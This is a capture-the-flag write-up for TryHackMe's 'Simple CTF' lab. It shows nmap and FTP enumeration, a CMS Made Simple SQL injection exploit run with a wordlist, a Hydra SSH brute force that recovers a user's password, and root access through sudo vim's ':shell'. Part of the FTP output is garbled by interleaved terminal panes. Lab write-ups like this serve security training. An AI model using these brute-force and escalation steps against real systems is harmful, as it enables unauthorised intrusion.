# Simple-CTF
### Nmap
`nmap -v -sC -sV -oN <DIRECTORY> $IP` ``` Host is up (0.39s 
latency). Not shown: 997 filtered ports PORT STATE SERVICE 
VERSION 21/tcp open ftp vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230) _Can't 
|get directory listing: TIMEOUT
| ftp-syst:
|   STAT: FTP server status:
|      Connected to ::ffff:10.11.12.253 Logged in as ftp 
|TYPE: ASCII No session bandwidth limit Session timeout in 
|seconds is 300 Control connection is plain text Data 
|connections will be plain text At session startup, client 
|count was 2 vsFTPd 3.0.3 - secure, fast, stable _End of 
|status
80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
| http-methods: _ Supported Methods: POST OPTIONS GET HEAD 
|http-robots.txt: 2 disallowed entries _/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu) _http-title: 
|Apache2 Ubuntu Default Page: It works
2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu 
Linux; protocol 2.0)
| ssh-hostkey:
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 
|(RSA) 256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c 
|(ECDSA) _ 256 
|12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: 
cpe:/o:linux:linux_kernel ```
### FTP
`$ ftp $IP` `ftp> ls -al` ``` ftp> ls -al 
│root@kali:~/Documents/TryHackMe/Simple-Ctf# ls 200 PORT 
command successful. Consider using PASV.  │Information 150 
Here comes the directory listing.  
│root@kali:~/Documents/TryHackMe/Simple-Ctf# ls drwxr-xr-x 3 
ftp ftp 4096 Aug 17 2019 .  │ForMitch.txt Information 
drwxr-xr-x 3 ftp ftp 4096 Aug 17 2019 ..  
│root@kali:~/Documents/TryHackMe/Simple-Ctf# ping 
10.10.56.123 drwxr-xr-x 2 ftp ftp 4096 Aug 17 2019 pub │PING 
10.10.56.123 (10.10.56.123) 56(84) bytes of data. 226 
Directory send OK.  │64 bytes from 10.10.56.123: icmp_seq=1 
ttl=63 time=275 ms ftp> cd pub │^C 250 Directory successfully 
changed.  │--- 10.10.56.123 ping statistics --- ftp> ls │2 
packets transmitted, 1 received, 50% packet loss, time 1002ms 
200 PORT command successful. Consider using PASV.  │rtt 
min/avg/max/mdev = 274.740/274.740/274.740/0.000 ms 150 Here 
comes the directory listing.  
│root@kali:~/Documents/TryHackMe/Simple-Ctf# mv ForMitch.txt 
Information/ -rw-r--r-- 1 ftp ftp 166 Aug 17 2019 
ForMitch.txt │root@kali:~/Documents/TryHackMe/Simple-Ctf# ls- 
al 226 Directory send OK.  │-bash: ls-: command not found 
ftp> get ForMitch.txt 
│root@kali:~/Documents/TryHackMe/Simple-Ctf# ls local: 
ForMitch.txt remote: ForMitch.txt │Information 200 PORT 
command successful. Consider using PASV.  
│root@kali:~/Documents/TryHackMe/Simple-Ctf# cd Information/ 
150 Opening BINARY mode data connection for ForMitch.txt (166 
bytes).  
│root@kali:~/Documents/TryHackMe/Simple-Ctf/Information# ls 
-al 226 Transfer complete.  │total 20 166 bytes received in 
0.00 secs (2.0039 MB/s) ``` `$ cat ForMitch.txt` ``` Dammit 
man... you'te the worst dev i've seen. You set the same pass 
for the system user, and the password is so weak... i cracked 
it in seconds. Gosh... what a mess! ```
### Port 80
> We go to the Browser for observing the Web-App
![Screenshot_2020-09-04_07-15-11](https://user-images.githubusercontent.com/56790998/92246651-0f733380-ee94-11ea-94cd-1ddb3bb2179e.png)
> We try searching for Robots.txt but the given directory 
> doesn't exist
![robots 
txt](https://user-images.githubusercontent.com/56790998/92246753-329de300-ee94-11ea-87f1-d1a68332f6aa.png)
> Since Gobuster was slow I tried to brute-force direectory 
> myself starting with the name of box *SIMPLE*
`$ curl http://$IP/simple` ``` <!DOCTYPE HTML PUBLIC 
"-//IETF//DTD HTML 2.0//EN"> <html><head> <title>301 Moved 
Permanently</title> </head><body> <h1>Moved Permanently</h1> 
<p>The document has moved <a 
href="http://10.10.56.123/simple/">here</a>.</p> <hr> 
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.56.123 Port 
80</address> </body></html> 
root@kali:~/Documents/TryHackMe/Simple-Ctf# ```
> Since it returned 301 we check that page
![simple_cms_home_page](https://user-images.githubusercontent.com/56790998/92247248-f323c680-ee94-11ea-9a50-0372f0de05c7.png)
## Enumeration
`$ searchsploit CMS made simple` 
![searchsploit](https://user-images.githubusercontent.com/56790998/92247687-8ceb7380-ee95-11ea-8d1e-80d50511df6f.png) 
![highlighted-exploit](https://user-images.githubusercontent.com/56790998/92247764-a8ef1500-ee95-11ea-88b3-d82d9100399a.png) 
`$ searchsploit -m php/webapps/46635.py` `$ mv 46635.py 
exploit.py` `$ pip install termcolor` `$ python exploit.py -u 
http://$IP/simple --crack -w 
/usr/share/wordlists/rockyou.txt`
> since this script takes a lot of time and its better to run 
> 2 enumeration we can try brute-forcing SSH using HYDRA
and user as mitch which we got from FTP `$ hydra -l mitch -P 
/usr/share/wordlists/rockyou.txt $IP -s 2222 -Vv` ``` 
[2222][ssh] host: 10.10.56.123 login: mitch password: secret 
``` `$ ssh mitch@10.10.56.123 -p 2222`
## Privilege Escalation
`$ which python3` ``` /usr/bin/python3 ``` `$ python3 -c 
'import pty;pty.spawn("/bin/bash")'` `$ sudo -l` ``` 
mitch@Machine:~$ sudo -l User mitch may run the following 
commands on Machine:
    (root) NOPASSWD: /usr/bin/vim ``` `$ sudo vim`
> Press escape then : and type shell
`:shell` `# whoami` ``` root ``` `# ls /home/mitch/user.txt` 
![user](https://user-images.githubusercontent.com/56790998/92249305-d89f1c80-ee97-11ea-9d21-ecb187edf5e3.png) 
`# ls /root/root.txt` 
![root](https://user-images.githubusercontent.com/56790998/92249210-b0172280-ee97-11ea-93f5-0152bc87dc23.png)
